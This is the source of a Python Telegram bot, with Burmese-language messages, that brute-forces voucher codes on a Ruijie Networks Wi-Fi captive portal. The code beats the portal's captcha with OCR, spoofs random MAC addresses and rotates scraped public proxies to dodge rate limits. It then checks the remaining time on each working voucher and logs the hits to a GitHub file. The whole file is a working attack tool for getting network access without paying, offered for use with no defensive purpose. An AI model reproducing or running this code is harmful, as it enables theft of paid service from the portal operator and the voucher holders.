import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, itertools
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# ── Environment variables ─────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
REPO_OWNER = os.environ.get("REPO_OWNER", "")
REPO_NAME = os.environ.get("REPO_NAME", "")

# ── Domain config ─────────────────────────────────────────────────────────
PORTAL_HOST = "portal-mm-as.ruijienetworks.com"
PORTAL_BASE = f"https://{PORTAL_HOST}"

# ── Performance config (1GB RAM tuned) ────────────────────────────────────
CONCURRENCY = 1500
BATCH_SIZE = 2500
CAPTCHA_RETRY = 4
REQUEST_RETRY = 2
POOL_SIZE = 200

# ── Proxy config ──────────────────────────────────────────────────────────
ENABLE_PROXY = True                  # False ထားရင် proxy မသုံး
PROXY_REFRESH_INTERVAL = 180         # ၃ မိနစ်တစ်ကြိမ် refresh
PROXY_VALIDATE_CONCURRENCY = 300     # validation concurrent
PROXY_VALIDATE_TIMEOUT = 5           # validation timeout (s)
PROXY_VALIDATE_URL = "http://httpbin.org/ip"

PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
]

# ── Global structures ─────────────────────────────────────────────────────
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)

user_data = {}
scan_tasks = {}
success_texts = {}
limited_texts = {}

notify_setting = {}
DEFAULT_NOTIFY = True
last_scan_params = {}
pending_brute = {}
success_messages = {}
limited_messages = {}

session = None
_connector = None
_voucher_sem = None
_session_pool = None
_start_time = time.monotonic()

# ── Dynamic Proxy Rotator ─────────────────────────────────────────────────
class DynamicProxyRotator:
    def __init__(self):
        self.proxies = []
        self.lock = asyncio.Lock()
        self.last_refresh = 0
        self._cycle = None
        self.total_fetched = 0
        self.total_valid = 0

    async def fetch_proxies(self):
        all_proxies = set()

        async def fetch_one(url):
            try:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    if resp.status == 200:
                        text = await resp.text()
                        for line in text.splitlines():
                            line = line.strip()
                            if not line or line.startswith("#"):
                                continue
                            # Format: ip:port or http://ip:port
                            if "://" not in line:
                                line = f"http://{line}"
                            # Basic validation
                            if re.match(r'^https?://[\d\.]+:\d+$', line):
                                all_proxies.add(line)
            except Exception as e:
                print(f"[proxy-fetch] {url[:60]}... → {e}")

        await asyncio.gather(*[fetch_one(u) for u in PROXY_SOURCES], return_exceptions=True)
        return list(all_proxies)

    async def validate_proxy(self, proxy):
        try:
            timeout = aiohttp.ClientTimeout(total=PROXY_VALIDATE_TIMEOUT)
            async with aiohttp.ClientSession(
                timeout=timeout, connector=_connector, connector_owner=False
            ) as s:
                async with s.get(PROXY_VALIDATE_URL, proxy=proxy) as resp:
                    if resp.status == 200:
                        return proxy
        except Exception:
            pass
        return None

    async def refresh(self):
        if not ENABLE_PROXY:
            return
        async with self.lock:
            print(f"[proxy] 🔄 Fetching candidates...")
            fetched = await self.fetch_proxies()
            self.total_fetched = len(fetched)
            print(f"[proxy] 📥 Fetched {len(fetched)} candidates, validating...")

            if not fetched:
                return

            # Random sample to avoid validating 10000+ proxies (slow)
            if len(fetched) > 3000:
                fetched = random.sample(fetched, 3000)

            sem = asyncio.Semaphore(PROXY_VALIDATE_CONCURRENCY)

            async def _val(p):
                async with sem:
                    return await self.validate_proxy(p)

            results = await asyncio.gather(*[_val(p) for p in fetched], return_exceptions=True)
            valid = [r for r in results if r and isinstance(r, str)]

            if valid:
                self.proxies = valid
                random.shuffle(self.proxies)
                self._cycle = itertools.cycle(self.proxies)
                self.last_refresh = time.monotonic()
                self.total_valid = len(valid)
                print(f"[proxy] ✅ {len(valid)} working proxies loaded")
            else:
                print(f"[proxy] ⚠️ No working proxies found this round")

    def get(self):
        if not ENABLE_PROXY or not self._cycle:
            return None
        try:
            return next(self._cycle)
        except StopIteration:
            return None

    def mark_bad(self, proxy):
        if proxy in self.proxies:
            try:
                self.proxies.remove(proxy)
                if self.proxies:
                    self._cycle = itertools.cycle(self.proxies)
                else:
                    self._cycle = None
                print(f"[proxy] ❌ Removed bad proxy (remaining: {len(self.proxies)})")
            except Exception:
                pass

    def stats(self):
        return {
            "enabled": ENABLE_PROXY,
            "alive": len(self.proxies),
            "last_refresh": int(time.monotonic() - self.last_refresh) if self.last_refresh else -1,
        }

proxy_rotator = DynamicProxyRotator()

async def proxy_refresh_loop():
    """Background task: refresh proxy pool periodically."""
    await asyncio.sleep(5)  # initial warm-up
    while True:
        try:
            await proxy_rotator.refresh()
        except Exception as e:
            print(f"[proxy-refresh] error: {e}")
        await asyncio.sleep(PROXY_REFRESH_INTERVAL)

# ── Web server ────────────────────────────────────────────────────────────
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    try:
        app = web.Application()
        app.router.add_get('/', handle)
        runner = web.AppRunner(app)
        await runner.setup()
        port = int(os.environ.get('PORT', os.environ.get('BOT_PORT', 8099)))
        site = web.TCPSite(runner, '0.0.0.0', port)
        await site.start()
        print(f"✅ Web server started on port {port}")
    except Exception as e:
        print(f"❌ Web server error: {e}")

# ── Session pool (for direct mode) ────────────────────────────────────────
def _new_session():
    return aiohttp.ClientSession(
        connector=_connector,
        connector_owner=False,
        cookie_jar=aiohttp.CookieJar(),
        timeout=aiohttp.ClientTimeout(total=30)
    )

async def init_session_pool():
    global _session_pool
    _session_pool = asyncio.Queue()
    for _ in range(POOL_SIZE):
        await _session_pool.put(_new_session())
    print(f"✅ Session pool ready: {POOL_SIZE}")

async def get_pooled_session():
    try:
        if _session_pool is not None:
            return _session_pool.get_nowait()
    except asyncio.QueueEmpty:
        pass
    return _new_session()

async def release_pooled_session(s):
    if s is None:
        return
    try:
        s.cookie_jar.clear()
    except:
        pass
    if _session_pool is not None and _session_pool.qsize() < POOL_SIZE * 2:
        await _session_pool.put(s)
    else:
        try:
            await s.close()
        except:
            pass

# ── GitHub helpers ─────────────────────────────────────────────────────────
async def get_file_content(path):
    try:
        url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
        headers = {"Authorization": f"token {GITHUB_TOKEN}"}
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                data = await response.json()
                content = base64.b64decode(data['content']).decode('utf-8')
                return json.loads(content), data['sha']
        return {}, None
    except Exception as e:
        print(f"[get_file_content] error: {e}")
        return {}, None

async def update_file_content(path, content, sha, message):
    try:
        url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Content-Type": "application/json"
        }
        encoded = base64.b64encode(json.dumps(content).encode()).decode()
        payload = {"message": message, "content": encoded, "sha": sha}
        async with session.put(url, headers=headers, json=payload) as response:
            return await response.text()
    except Exception as e:
        print(f"[update_file_content] error: {e}")
        return None

# ── Helper functions ───────────────────────────────────────────────────────
def plan_to_minutes(s):
    if not s:
        return 0
    s = s.strip().lower()
    if s in ('unlimit', 'unlimited'):
        return float('inf')
    total = 0
    for val, unit in re.findall(r'(\d+)\s*(mo|min|h|d|m)\b', s):
        val = int(val)
        if unit == 'mo':
            total += val * 30 * 24 * 60
        elif unit == 'd':
            total += val * 24 * 60
        elif unit == 'h':
            total += val * 60
        elif unit in ('min', 'm'):
            total += val
    return total

def _parse_seconds(val):
    secs = int(val)
    hours = secs // 3600
    mins = (secs % 3600) // 60
    if hours > 0:
        return f"{hours}h {mins}m"
    elif mins > 0:
        return f"{mins}m"
    return f"{secs}s"

def _parse_minutes(val):
    total_mins = int(val)
    if total_mins <= 0:
        return "0m"
    if total_mins < 60:
        return f"{total_mins}m"
    hours = total_mins // 60
    mins = total_mins % 60
    if hours < 24:
        return f"{hours}h {mins}m" if mins else f"{hours}h"
    days = hours // 24
    rem_hours = hours % 24
    if days < 30:
        return f"{days}d {rem_hours}h" if rem_hours else f"{days}d"
    months = days // 30
    rem_days = days % 30
    return f"{months}mo {rem_days}d" if rem_days else f"{months}mo"

async def get_balance(token):
    url = f"http://{PORTAL_HOST}/api/auth/balance/getBalance/{token}"
    cookies = {
        'sensorsdata2015jssdkcross': '%7B%22distinct_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%7D',
    }
    headers = {
        'authority': PORTAL_HOST,
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;',
        'referer': f'{PORTAL_BASE}/download/static/maccauth/src/balance.html?sessionId={token}&lang=en_US&authType=15',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        async with session.get(url, headers=headers, cookies=cookies,
                               timeout=aiohttp.ClientTimeout(total=10)) as resp:
            raw = await resp.text()
            if resp.status != 200:
                alt_url = f"{PORTAL_BASE}/api/macc2/balance/getBalance/{token}"
                async with session.get(alt_url, headers=headers, cookies=cookies,
                                       timeout=aiohttp.ClientTimeout(total=10)) as alt_resp:
                    raw = await alt_resp.text()
                    if alt_resp.status != 200:
                        return "N/A"
            try:
                data = json.loads(raw)
            except Exception:
                return "N/A"

            candidates = [data]
            for nested_key in ['result', 'data']:
                if isinstance(data, dict) and isinstance(data.get(nested_key), dict):
                    candidates.append(data[nested_key])

            for d in candidates:
                if not isinstance(d, dict):
                    continue
                for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 'leftMinutes', 'balance', 'remaining']:
                    val = d.get(key)
                    if val is not None:
                        return _parse_minutes(val)
                for key in ['remainingSeconds', 'remainTime', 'remainingTime', 'leftTime', 'timeLeft', 'remain_time']:
                    val = d.get(key)
                    if val is not None:
                        return _parse_seconds(val)
            return "N/A"
    except Exception as e:
        print(f"[get_balance] error for {token}: {e}")
        return "N/A"

# ── Mode-based code iterator ─────────────────────────────────────────────
MODE_DESCRIPTIONS = {
    "1": ("0-9", string.digits),
    "2": ("a-z", string.ascii_lowercase),
    "3": ("A-Z", string.ascii_uppercase),
    "4": ("a-zA-Z", string.ascii_letters),
    "5": ("a-z0-9", string.ascii_lowercase + string.digits),
}

def get_mode_charset(mode):
    if mode not in MODE_DESCRIPTIONS:
        raise ValueError(f"Unsupported mode: {mode}")
    return MODE_DESCRIPTIONS[mode][1]

def get_mode_total(mode, length):
    return len(get_mode_charset(mode)) ** length

def iter_codes(mode, length):
    chars = get_mode_charset(mode)
    for combo in itertools.product(chars, repeat=length):
        yield "".join(combo)

def format_progress(checked, total=None, speed=0, found=0, target=None):
    lines = [
        "📋 Status: Running",
        f"⚡ Speed: {speed:,.0f}/min",
        f"🔍 Checked: {checked:,}",
        f"💎 Found: {found}",
    ]
    if total:
        pct = (checked / total * 100) if total else 0
        lines.append(f"📊 Progress: {pct:.4f}% ({checked:,}/{total:,})")
    if target:
        lines.append(f"🎯 Target: {found}/{target}")
    return "\n".join(lines)

# ── Captcha handling ──────────────────────────────────────────────────────
_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None:
            return None
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        blur = cv2.GaussianBlur(gray, (3, 3), 0)
        _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, buffer = cv2.imencode('.png', thresh)
        result = _ocr.classification(buffer.tobytes())
        return result.upper() if result else None
    except Exception as e:
        print(f"[_ocr_sync] error: {e}")
        return None

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session_obj, session_url, previous_session_id=None, proxy=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'referer': url,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
    }
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True,
                                    proxy=proxy) as req:
            response = str(req.url)
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return sid.group(1) if sid else previous_session_id
    except:
        return previous_session_id

async def Captcha_Image(session_obj, session_id, proxy=None):
    headers = {
        'authority': PORTAL_HOST,
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'referer': f'{PORTAL_BASE}/download/static/maccauth/src/index.html',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session_obj.get(f'{PORTAL_BASE}/api/auth/captcha/image',
                               params=params, headers=headers, proxy=proxy) as req:
        return await req.read()

async def Varify_Captcha(session_obj, session_id, text, proxy=None):
    headers = {
        'authority': PORTAL_HOST,
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': PORTAL_BASE,
        'referer': f'{PORTAL_BASE}/download/static/maccauth/src/index.html',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session_obj.post(f'{PORTAL_BASE}/api/auth/captcha/verify',
                                headers=headers, json=json_data, proxy=proxy) as req:
        data = await req.json()
        return session_id if data.get("success") == True else None

async def check_session_url(session_url):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'referer': session_url,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
    }
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers) as response:
            return "sessionId" in str(response.url)
    except:
        return False

# ── Core voucher check (with proxy) ───────────────────────────────────────
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                        message=None, plan_filters=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = f"{PORTAL_BASE}/api/auth/voucher/?lang=en_US"

    response = None
    session_id = None

    # Get a proxy for this check (None = direct)
    proxy_url = proxy_rotator.get()
    use_pool = proxy_url is None  # pool only for direct mode

    for attempt in range(REQUEST_RETRY):
        # Session: pooled (direct) or fresh (proxy)
        if use_pool:
            task_session = await get_pooled_session()
        else:
            task_session = aiohttp.ClientSession(
                connector=_connector, connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=aiohttp.ClientTimeout(total=30)
            )

        try:
            session_id = await get_session_id(task_session, session_url, proxy=proxy_url)
            if not session_id:
                if proxy_url:
                    proxy_rotator.mark_bad(proxy_url)
                    proxy_url = proxy_rotator.get()
                continue

            auth_code = None
            for _ in range(CAPTCHA_RETRY):
                try:
                    image = await Captcha_Image(task_session, session_id, proxy=proxy_url)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    if await Varify_Captcha(task_session, session_id, text, proxy=proxy_url):
                        auth_code = text
                        break
                except:
                    continue
            if not auth_code:
                if proxy_url:
                    proxy_rotator.mark_bad(proxy_url)
                    proxy_url = proxy_rotator.get()
                continue

            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": PORTAL_HOST,
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": PORTAL_BASE,
                "referer": f"{PORTAL_BASE}/download/static/maccauth/src/index.html?sessionId={session_id}",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers,
                                              proxy=proxy_url) as req:
                    response = await req.text()
            except:
                response = None
                if proxy_url:
                    proxy_rotator.mark_bad(proxy_url)
                    proxy_url = proxy_rotator.get()
        finally:
            if use_pool:
                await release_pooled_session(task_session)
            else:
                try:
                    await task_session.close()
                except:
                    pass

        if response and 'request limited' in response:
            await asyncio.sleep(random.uniform(0.5, 1.5))
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code

        plan_str = "N/A"
        try:
            res_data = json.loads(response)
            logon_url = res_data.get("result", {}).get("logonUrl", "") if isinstance(res_data, dict) else ""
            token_match = re.search(r'token=(.*?)&', logon_url)
            token = token_match.group(1) if token_match else None
            if not token:
                sid_match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", logon_url)
                token = sid_match.group(1) if sid_match else session_id
            fetched = await get_balance(token)
            if isinstance(fetched, str) and fetched not in ("N/A", "Error"):
                plan_str = fetched
        except Exception:
            pass

        if plan_filters:
            code_mins = plan_to_minutes(plan_str)
            if not any(code_mins >= plan_to_minutes(f) for f in plan_filters):
                return None

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        success_texts[chat_id].append({"code": code, "session_id": session_id, "plan": plan_str})

        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code, "session_id": session_id, "plan": plan_str})

        if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
            code_line = "\n".join([f"`{item['code']}` – ⏳ {item['plan']}" for item in success_texts[chat_id]])
            try:
                if chat_id not in success_messages:
                    sent = await bot.send_message(chat_id, f"✅ Success Codes:\n{code_line}", parse_mode="Markdown")
                    success_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        chat_id=chat_id, message_id=success_messages[chat_id],
                        text=f"✅ Success Codes:\n{code_line}", parse_mode="Markdown"
                    )
            except:
                pass
        return code

    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)
        if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
            limited_line = "\n".join(limited_texts[chat_id])
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id, f"⚠️ Limited Codes:\n{limited_line}")
                    limited_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        chat_id=chat_id, message_id=limited_messages[chat_id],
                        text=f"⚠️ Limited Codes:\n{limited_line}"
                    )
            except:
                pass

# ── Brute-force runner ─────────────────────────────────────────────────────
async def run_bruteforce(mode, length, chat_id, session_url, scan_id, target=None,
                        message=None, progress_msg=None, plan_filters=None):
    try:
        code_iter = iter_codes(mode, length)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    total = get_mode_total(mode, length)

    checked = 0
    found = 0
    scan_start = time.monotonic()

    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                last_scan_params[chat_id] = {
                    "mode": mode, "length": length,
                    "target": target, "plan_filters": plan_filters or []
                }
                scan_tasks.pop(chat_id, None)
                return

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(
                        session_url, code, chat_id, scan_id,
                        message=message, plan_filters=plan_filters
                    )

            results = await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)

            for res in results:
                if res:
                    found += 1
                    if target and found >= target:
                        try:
                            await progress_msg.edit_text("🎯 Target reached!")
                        except:
                            await bot.send_message(chat_id, "🎯 Target reached!")
                        scan_tasks.pop(chat_id, None)
                        last_scan_params.pop(chat_id, None)
                        return

            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            text = format_progress(checked, total, speed, found, target)
            try:
                await bot.edit_message_text(
                    chat_id=chat_id, message_id=progress_msg.message_id, text=text
                )
            except:
                try:
                    new_msg = await bot.send_message(chat_id, text)
                    progress_msg.message_id = new_msg.message_id
                except:
                    pass

        if progress_msg:
            finish_text = f"✅ Scan completed.\n🔍 Total: {checked:,}\n💎 Found: {found}"
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text)
            except:
                await bot.send_message(chat_id, finish_text)
        scan_tasks.pop(chat_id, None)
        last_scan_params.pop(chat_id, None)
    finally:
        scan_tasks.pop(chat_id, None)

# ── GitHub update scheduler ────────────────────────────────────────────────
async def github_update_scheduler():
    global SUCCESS_CODE
    while True:
        await asyncio.sleep(80)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results, sha = await get_file_content("result.json")
                for item in items:
                    chat_id = str(item["chat_id"])
                    code = item["code"]
                    if chat_id not in results:
                        results[chat_id] = []
                    if code not in results[chat_id]:
                        results[chat_id].append(code)
                await update_file_content("result.json", results, sha, "Periodic Update")
            except Exception as e:
                print(f"Update Error: {e}")

# ── Bot commands ───────────────────────────────────────────────────────────
@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message,
        "Bot စတင်ပါပြီ။\n\n"
        "📖 အသုံးပြုနည်းအတွက် /help ကိုနှိပ်ပါ။"
    )

@bot.message_handler(commands=['help'])
async def help_cmd(message):
    help_text = (
        "📖 **Voucher Bot အသုံးပြုနည်း လမ်းညွှန်**\n\n"
        "**၁။ Setup:**\n"
        "`/setup <url>`\n\n"
        "**၂။ ရှာဖွေခြင်း:**\n"
        "`/brute <mode> <length> [target]`\n"
        "Mode:\n"
        "  1 = ဂဏန်းသီးသန့် (0-9)\n"
        "  2 = အင်္ဂလိပ်စာလုံးအသေး (a-z)\n"
        "  3 = အင်္ဂလိပ်စာလုံးအကြီး (A-Z)\n"
        "  4 = စာလုံးအကြီး+အသေး (a-zA-Z)\n"
        "  5 = စာလုံး+ဂဏန်း (a-z, 0-9)\n"
        "Length: 1 မှ 10\n"
        "ဥပမာ: `/brute 1 6 5`\n\n"
        "**၃။** `/status` – အခြေအနေကြည့်\n"
        "**၄။** `/stop` – ရပ်တန့်ခြင်း\n"
        "**၅။** `/resume` – ဆက်ရှာဖွေခြင်း\n"
        "**၆။** `/saved` – ရလဒ်ကြည့်ခြင်း\n"
        "**၇။** `/delete_saved` – ရလဒ်ဖျက်ခြင်း\n"
        "**၈။** `/recheck` – Success codes ပြန်စစ်ခြင်း\n"
        "**၉။** `/notify` – Notification ON/OFF\n"
        "**၁၀။** `/proxy` – Proxy အခြေအနေကြည့်"
    )
    await bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['proxy'])
async def proxy_status(message):
    s = proxy_rotator.stats()
    status_text = (
        f"🌐 **Proxy Status**\n\n"
        f"Enabled: {'✅' if s['enabled'] else '❌'}\n"
        f"Alive: `{s['alive']}`\n"
        f"Last Refresh: `{s['last_refresh']}s ago`\n"
        f"Fetched (last): `{proxy_rotator.total_fetched}`\n"
        f"Valid (last): `{proxy_rotator.total_valid}`\n"
    )
    await bot.reply_to(message, status_text, parse_mode="Markdown")

@bot.message_handler(commands=['setup'])
async def handle_setup(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "အသုံးပြုနည်း:\n`/setup your_session_url`", parse_mode="Markdown")
        return
    url = args[1]
    await bot.reply_to(message, "Session URL စစ်ဆေးနေပါသည်...")
    if await check_session_url(url):
        cid = message.chat.id
        user_data[cid] = {'session_url': url}
        success_texts.pop(cid, None)
        limited_texts.pop(cid, None)
        last_scan_params.pop(cid, None)
        pending_brute.pop(cid, None)
        success_messages.pop(cid, None)
        limited_messages.pop(cid, None)
        try:
            results, sha = await get_file_content("result.json")
            if str(cid) in results:
                del results[str(cid)]
                await update_file_content("result.json", results, sha, f"Clear codes for {cid}")
        except Exception as e:
            print(f"[setup] Failed to clear GitHub result.json: {e}")
        await bot.reply_to(message, "✅ Session URL သိမ်းဆည်းပြီးပါပြီ။ /brute ဖြင့် စတင်ပါ။")
    else:
        await bot.reply_to(message, "Session URL မှားယွင်းနေပါသည်။")

@bot.message_handler(commands=['brute'])
async def brute(message):
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message,
            "အသုံးပြုနည်း:\n"
            "`/brute <mode> <length> [target]`\n\n"
            "Mode:\n"
            "  1 = ဂဏန်းသီးသန့် (0-9)\n"
            "  2 = အင်္ဂလိပ်စာလုံးအသေး (a-z)\n"
            "  3 = အင်္ဂလိပ်စာလုံးအကြီး (A-Z)\n"
            "  4 = စာလုံးအကြီး+အသေး (a-zA-Z)\n"
            "  5 = စာလုံး+ဂဏန်း (a-z, 0-9)\n\n"
            "Length: 1 မှ 10\n"
            "ဥပမာ: `/brute 1 6 5`",
            parse_mode="Markdown"
        )
        return

    mode = args[1]
    if mode not in MODE_DESCRIPTIONS:
        await bot.reply_to(message, "Mode သည် 1-5 အတွင်း ဖြစ်ရပါမည်။\n/help ကြည့်ပါ။")
        return

    try:
        length = int(args[2])
        if length < 1 or length > 10:
            await bot.reply_to(message, "Length သည် 1 မှ 10 အတွင်း ဖြစ်ရပါမည်။")
            return
    except ValueError:
        await bot.reply_to(message, "Length သည် ဂဏန်းဖြစ်ရပါမည်။")
        return

    target = None
    if len(args) >= 4:
        try:
            target = int(args[3])
        except ValueError:
            await bot.reply_to(message, "Target သည် ဂဏန်းဖြစ်ရပါမည်။")
            return

    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
        return

    if chat_id in last_scan_params:
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("Resume", callback_data="resume_scan"),
            InlineKeyboardButton("New Scan", callback_data="new_scan")
        )
        pending_brute[chat_id] = {"mode": mode, "length": length,
                                   "target": target, "plan_filters": []}
        prev = last_scan_params[chat_id]
        await bot.reply_to(message,
            f"ယခင် scan ရပ်ထားသည် (mode: {prev['mode']}, length: {prev['length']}, target: {prev['target']}).\n"
            f"ပြန်စမလား၊ အသစ်စမလား?",
            reply_markup=markup)
        return

    await start_brute_scan(chat_id, mode, length, target, message, plan_filters=[])

async def start_brute_scan(chat_id, mode, length, target, original_message, plan_filters=None):
    plan_filters = plan_filters or []
    mode_desc = MODE_DESCRIPTIONS[mode][0]
    total = get_mode_total(mode, length)
    info = f"Mode: {mode} ({mode_desc}) | Length: {length} | Total: {total:,}"
    if target:
        info += f" | Target: {target}"
    progress_msg = await bot.send_message(chat_id, f"Preparing...\n{info}")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode, length, chat_id, user_data[chat_id]['session_url'],
            scan_id, target, message=original_message,
            progress_msg=progress_msg, plan_filters=plan_filters
        )
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data:
        data["stop"] = True
        if not data["task"].done():
            data["task"].cancel()
        await bot.reply_to(message, "Scan ရပ်ထားပါသည်။ ပြန်စလိုပါက /resume ကိုသုံးပါ။")
    else:
        await bot.reply_to(message, "ရပ်ရန် scan မရှိပါ။")

@bot.message_handler(commands=['resume'])
async def resume_scan(message):
    chat_id = message.chat.id
    if chat_id not in last_scan_params:
        await bot.reply_to(message, "ယခင်ရပ်ထားသော scan မရှိပါ။")
        return
    params = last_scan_params.pop(chat_id)
    await start_brute_scan(chat_id, params['mode'], params['length'],
                            params['target'], message,
                            plan_filters=params.get('plan_filters', []))
    await bot.reply_to(message, "ယခင် scan ပြန်စပါပြီ။")

@bot.callback_query_handler(func=lambda call: call.data in ["resume_scan", "new_scan"])
async def handle_resume_callback(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    if call.data == "resume_scan":
        if chat_id not in last_scan_params:
            await bot.edit_message_text("Resume လုပ်ရန် scan မရှိပါ။",
                                        chat_id=chat_id,
                                        message_id=call.message.message_id)
            return
